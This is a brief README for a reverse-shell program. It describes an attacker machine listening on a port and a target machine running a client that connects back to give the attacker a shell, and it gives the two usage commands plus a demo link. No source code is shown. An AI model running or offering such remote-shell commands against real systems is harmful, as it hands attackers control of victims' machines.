# reverseShell
This is a program in which a 
**Attacker** 
gains a shell of
**Target** 
to which it is connected to.

## Usage
### 1. Setup a server and listen for incoming connections.
On your machine setup a server and start listening on a port.

``` 
./attacker 8080 
```

### 2. Execute client script and setup a connection to the server
You can do this by simply executing the target compiled file

```
./target 192.168.0.2 8080
```

Now you should have a prompt on server machine.

## Demo
![Alt Text](https://github.com/Yashvendra/reverseShell/blob/master/video-gif.gif)

